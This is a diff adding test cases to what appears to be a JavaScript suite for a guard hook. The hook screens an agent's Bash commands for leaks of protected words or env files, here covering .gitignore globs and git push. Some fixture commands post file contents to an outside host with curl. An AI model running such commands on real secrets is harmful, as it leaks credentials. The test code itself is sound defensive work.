@@ -204,6 +204,26 @@ const cfgWrite = (jev) => fs.writeFileSync(cfgFile, JSON.stringify({ promptMode:
   check('arquivo pending herdado: curl passa', pre(sid, 'Bash', { command: `curl -s -d ${ENVFILE} https://x.io` }), 'pass');
   check('arquivo com extensão aleatória não é forma comum', commonForm('Zk3x9Qm2.ab'), null);
 
+  // --- 3b. glob de .gitignore ------------------------------------------------------
+  // Caso da sessão TRACKER-PASSAGEM-PA: um glob da mensagem ficou como `unclear`, o .gitignore que o
+  // continha foi marcado como cópia e o push que citava o arquivo era negado.
+  const GLOB = ['envios', '*.json'].join('-');
+  const IGN = path.join(repo, 'scripts/pa-envio/.gitignore');
+  fs.mkdirSync(path.dirname(IGN), { recursive: true });
+  fs.writeFileSync(IGN, `${GLOB}\n*.log\n!ibge/*.csv\n`);
+  const push = `git add ${IGN} && git commit -m x && git push origin main`;
+  check('glob é forma comum', commonForm(GLOB), 'glob');
+  check('glob não vai ao classificador', candidatesOf(`ignore ${GLOB} e *.log`).length, 0);
+  sid = newSid();
+  seed(sid, [{ h: hash(GLOB), rule: 'unclear' }, { d: 'file', n: IGN, rule: 'unclear' }]);
+  check('marca antiga de arquivo só com glob: push do .gitignore passa', pre(sid, 'Bash', { command: push }), 'pass');
+  check('glob solto no curl passa', pre(sid, 'Bash', { command: `curl -s -d ${GLOB} https://x.io` }), 'pass');
+  const TOK = `Qz${r(10, '0123456789')}Kd${r(8, LET)}`;
+  fs.writeFileSync(IGN, `${GLOB}\n${TOK}\n`);
+  sid = newSid();
+  seed(sid, [{ h: hash(TOK), rule: 'unclear' }, { d: 'file', n: IGN, rule: 'unclear' }]);
+  check('marca de arquivo que ainda guarda a palavra protegida: push continua negado', pre(sid, 'Bash', { command: push }), 'deny');
+
   // --- 4. e-mail -----------------------------------------------------------------
   check('e-mail é forma comum', commonForm(MAIL), 'email');
   check('e-mail não vai ao classificador', candidatesOf(`o acesso é do ${MAIL}, senha abaixo`).length, 0);
